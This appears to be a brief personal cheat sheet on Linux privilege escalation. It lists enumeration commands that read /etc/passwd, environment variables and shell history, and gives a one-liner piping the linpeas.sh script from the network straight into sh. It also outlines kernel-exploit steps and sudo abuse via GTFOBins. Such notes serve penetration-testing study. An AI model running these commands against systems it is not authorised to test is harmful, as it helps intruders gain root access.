# privellege escilation

## Enumaration

```hostname```
```uname -a```
```cat /proc/version```
```cat /etc/passwd```
```env```
```history```

# Automated tools

```curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh```

## kernel exploits 
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.


The Kernel exploit methodology is simple;

* Identify the kernel version
* Search and find an exploit code for the kernel version of the target system
* Run the exploit


Most of the cves can be found in [linux exploit cves]( https://www.linuxkernelcves.com/cves )


## Privilege Escalation: Sudo services
Any user can check its current situation related to root privileges using the ```sudo -l``` command.
[GFTOBINS](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
